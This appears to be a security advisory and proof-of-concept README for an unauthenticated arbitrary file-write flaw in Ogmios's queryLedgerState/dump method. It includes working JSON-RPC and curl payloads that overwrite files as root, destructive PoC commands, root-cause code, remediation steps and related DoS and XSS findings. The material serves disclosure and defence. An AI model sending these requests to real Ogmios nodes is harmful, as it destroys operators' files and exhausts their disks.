# Ogmios `queryLedgerState/dump` — Unauthenticated Arbitrary File Write

**CWE-73: External Control of File Name or Path**

A JSON-RPC method in [Ogmios](https://github.com/CardanoSolutions/ogmios) accepts a
filesystem path from an unauthenticated client and writes the node's ledger state to
it. There is no path validation, no directory confinement, no quota, and no
authentication.

```
POST / HTTP/1.1
Content-Type: application/json

{"jsonrpc":"2.0","id":"pwn","method":"queryLedgerState/dump",
 "params":{"to":"/any/path/you/want"}}
```

```
$ curl -s -X POST http://127.0.0.1:1337/ -H 'Content-Type: application/json' \
    -d '{"jsonrpc":"2.0","id":1,"method":"queryLedgerState/dump",
         "params":{"to":"/root/victim.conf"}}'
{"jsonrpc":"2.0","method":"queryLedgerState/dump","result":null,"id":1}

$ ls -la /root/victim.conf
-rw-r--r-- 1 root root 1028673 ... /root/victim.conf   # was 21 bytes
```

---

## Impact

| | |
|---|---|
| **Authentication** | None. No token, no header, no origin check. |
| **Path control** | Full. Absolute or relative, `../` allowed, no confinement. |
| **Content control** | **None.** Content is the node's CBOR `NewEpochState`, not attacker bytes. |
| **Primitive** | Create + **truncate-overwrite** (`writeFileLBS` truncates before writing). |
| **Privilege** | Whatever Ogmios runs as — **root** in the official Docker images. |

### What this gets an attacker

1. **Destructive overwrite of any writable file.** `~/.ssh/authorized_keys`,
   crontabs, the Ogmios binary, or the node's key material can be clobbered —
   a denial of service, and potentially operator lockout requiring console access.
2. **Disk exhaustion.** No quota, no dedup. Repeated calls each write a full
   ledger dump. Measured: **~1 MB per call on preview**; these are **multi-GB on mainnet**.
3. **Integrity damage that is hard to notice.** A corrupted file is not obviously
   wrong; if it is consumed by something that trusts it, the failure is silent.

### What this does *not* get an attacker

**This is not RCE.** The attacker controls the *path*; the *content* is fixed
node CBOR. You cannot use it to:

- write a valid `authorized_keys` line — you would be writing CBOR, not `ssh-ed25519 AAAA...`
- write an executable script, ELF, or `authorized_keys` entry
- inject valid YAML/JSON config of your choosing

This is a **destructive file-write / DoS and integrity bug**, not code execution.
The honest ceiling is "destroy files as root and fill the disk."

---

## Root cause

`server/src/Ogmios/Data/Json/Query.hs:1243-1297`

```haskell
parseQueryLedgerDump genResult =
    Json.withObject "dump" $ \obj -> do
        filepath :: FilePath <- obj .: "to"        -- <-- attacker-controlled, unchecked
        pure $ \case
            SomeShelleyEra ShelleyBasedEraConway ->
                Just $ SomeEffectfullQuery
                    (LSQ.BlockQuery $ QueryIfCurrentConway $ GetCBOR DebugNewEpochState)
                    (saveToDisk filepath . eraMismatchOrResult unSerialised)
                    ...
  where
    saveToDisk filepath = \case
        Left err -> pure (Left err)
        Right bytes -> do
            writeLByteString filepath bytes        -- <-- writeFileLBS: truncates + writes
            pure $ Right encodeNull
```

`server/src/Ogmios/Control/MonadDisk.hs:20-21`

```haskell
instance MonadDisk IO where
    writeLByteString = writeFileLBS    -- follows symlinks, truncates, no O_NOFOLLOW
```

This is the **only** file-write call in the entire server. The method is reachable
via both the WebSocket endpoint and the `POST /` HTTP proxy
(`server/src/Ogmios/App/Server/Http.hs:116-134`).

---

## Reproducing

Requires Docker. Brings up cardano-node (preview testnet) + Ogmios:

```bash
cd lab && docker compose up -d
# wait ~60s for the node to sync and Ogmios to connect
```

Run the PoC (non-destructive by default):

```bash
python3 poc/ogmios_dump_poc.py --outdir /evidence --host-prefix "$(pwd)/lab/evidence"
```

Full run including the destructive checks:

```bash
echo "ORIGINAL" > lab/evidence/victim.conf
docker exec ogmios-poc-ogmios mkdir -p /evidence/dumps   # Ogmios can't mkdir
python3 poc/ogmios_dump_poc.py \
  --outdir /evidence --host-prefix "$(pwd)/lab/evidence" \
  --destructive --victim /evidence/victim.conf --count 3
```

Expected output:

```
[+] ARBITRARY PATH WRITE CONFIRMED -> .../poc_arbitrary_path.bin (1,027,673 bytes)
[+] TRAVERSAL CONFIRMED -> Ogmios resolved a relative path against its CWD
[*] first bytes written: 871821bf581c04f0      <- CBOR, i.e. NOT attacker-controlled
[+] OVERWRITE CONFIRMED -> .../victim.conf: 21 -> 1,028,705 bytes
[+] wrote 3,086,197 bytes across 3 unauthenticated requests
```

### Verified against

- `cardanosolutions/ogmios:latest` (nightly `435189ae`)
- `ghcr.io/intersectmbo/cardano-node:11.1.3`, preview testnet

---

## Exposure note

Ogmios defaults to `--host 127.0.0.1`, which is safe. However the shipped
`docker-compose.yml` overrides this:

```yaml
command: [ "--host", "0.0.0.0", ... ]
ports:   [ "${OGMIOS_PORT:-1337}:1337" ]
```

and every endpoint returns `Access-Control-Allow-Origin: *`. A deployment that
follows the shipped compose file is reachable from the network **and** from any
web page the operator visits.

---

## Remediation

1. **Remove `queryLedgerState/dump`**, or gate it behind an explicit opt-in flag
   that is off by default (e.g. `--allow-ledger-dump`). It is a debugging aid,
   not a production API.
2. If retained, confine writes to a dedicated dump directory, reject any path
   that is not a direct child of it after normalisation, open with `O_NOFOLLOW`
   to stop symlink redirection, and refuse to clobber existing files.
3. Add a quota / rate limit on ledger dumps.
4. Bind to `127.0.0.1` by default in the compose file, and drop
   `Access-Control-Allow-Origin: *` from `POST /`.

---

## Responsible disclosure

This PoC is published for defensive research and to allow operators to verify
their own exposure. The vulnerable code is present in upstream Ogmios as of
`nightly (435189ae)`.

If you operate Ogmios, treat this as **actively exploitable** until patched —
especially if you run the shipped compose file or bind to `0.0.0.0`.

---

## Related findings from the same review

Not part of this PoC, found while auditing:

- **`queryLedgerState/utxo` with no params returns the entire UTXO set** with no
  pagination. Measured **171,463x amplification** (63-byte request → 10.8 MB
  response on preview). No `-M` heap cap, no streaming, no connection limit →
  OOM/GC-thrash DoS.
- **Unbounded request bodies.** A 100 MB `POST /` body was accepted; RSS reached
  750 MB. No `Warp.setMaxRequestBodySize`.
- **Connection amplification.** Each WebSocket connection opens 2 cardano-node
  connections; each `POST /` opens a WebSocket internally.
- **DOM XSS sink.** The served dashboard has one `innerHTML` assignment
  (`JSON.stringify` of an error object) and ships **no CSP** or `nosniff`.

---

## License

MIT. See [LICENSE](LICENSE).

This project is not affiliated with or endorsed by CardanoSolutions.